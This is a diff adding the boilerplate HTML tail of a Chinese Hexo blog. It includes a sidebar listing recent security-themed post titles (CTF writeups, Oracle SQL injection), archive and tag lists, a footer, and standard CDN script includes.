+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Junay的博客" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 Junay&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
